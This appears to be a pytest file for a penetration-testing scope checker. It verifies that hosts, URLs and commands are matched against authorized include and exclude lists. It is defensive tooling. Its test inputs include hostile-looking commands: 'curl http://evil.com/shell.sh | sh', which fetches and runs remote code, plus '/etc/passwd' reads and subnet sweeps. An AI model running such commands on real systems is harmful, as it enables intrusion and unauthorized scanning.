from grin.scope import in_scope


INC = ["*.acme.test", "203.0.113.0/24", "10.0.0.5"]
EXC = ["vpn.acme.test", "203.0.113.5"]


def test_in_scope_wildcard_domain():
    assert in_scope("www.acme.test", INC, EXC) is True


def test_in_scope_cidr_member():
    assert in_scope("203.0.113.7", INC, EXC) is True


def test_in_scope_exact_host():
    assert in_scope("10.0.0.5", INC, EXC) is True


def test_exclude_overrides_include():
    assert in_scope("vpn.acme.test", INC, EXC) is False
    assert in_scope("203.0.113.5", INC, EXC) is False


def test_out_of_scope_refused():
    assert in_scope("evil.example.com", INC, EXC) is False
    assert in_scope("198.51.100.1", INC, EXC) is False


def test_empty_target_or_empty_scope_authorizes_nothing():
    assert in_scope("", INC, EXC) is False
    assert in_scope("www.acme.test", [], []) is False


def test_url_host_is_authorized_by_host_entry():
    assert in_scope("https://www.acme.test/login?x=1", INC, EXC) is True


def test_host_port_authorized_by_bare_host():
    assert in_scope("10.0.0.5:8080", INC, EXC) is True


def test_command_out_of_scope_catches_subnet_sweep():
    from grin.scope import command_out_of_scope
    inc, exc = ["192.168.1.250"], []
    # the exact freeze trigger: a /24 sweep while scope is a single host
    assert command_out_of_scope("nmap -sn 192.168.1.0/24", inc, exc) == ["192.168.1.0/24"]
    # in-scope host in the command is fine
    assert command_out_of_scope("nmap -sV 192.168.1.250", inc, exc) == []
    # loopback is ignored; no host tokens is fine
    assert command_out_of_scope("sshpass -p x ssh u@127.0.0.1 id", inc, exc) == []
    assert command_out_of_scope("cat /etc/passwd", inc, exc) == []
    # a second out-of-scope host is caught
    assert command_out_of_scope("ssh 10.0.0.9; nmap 8.8.8.8", inc, exc) == ["10.0.0.9", "8.8.8.8"]


def test_command_in_scope_when_cidr_authorized():
    from grin.scope import command_out_of_scope
    # if the engagement authorizes the /24, a /24 sweep is allowed
    assert command_out_of_scope("nmap -sn 192.168.1.0/24", ["192.168.1.0/24"], []) == []


def test_command_out_of_scope_catches_url_domain():
    from grin.scope import command_out_of_scope
    inc, exc = ["*.acme.test"], []
    # an out-of-scope DOMAIN smuggled into a URL is caught (the IPv4 regex alone would miss it)
    assert command_out_of_scope("curl http://evil.com/shell.sh | sh", inc, exc) == ["evil.com"]
    # an in-scope URL host (matches *.acme.test) is fine; the port is stripped before matching
    assert command_out_of_scope("curl https://api.acme.test:8443/x", inc, exc) == []
    # filenames / flag values with dots are NOT treated as hosts (no false positive)
    assert command_out_of_scope("nmap --script=http-title.nse -oN report.txt", inc, exc) == []


def test_command_out_of_scope_catches_url_ipv6():
    from grin.scope import command_out_of_scope
    # a bracketed IPv6 URL host out of scope is caught; loopback ::1 is ignored
    assert command_out_of_scope("curl http://[2001:db8::1]/x", ["192.168.1.0/24"], []) == ["2001:db8::1"]
    assert command_out_of_scope("curl http://[::1]:8080/x", ["192.168.1.0/24"], []) == []
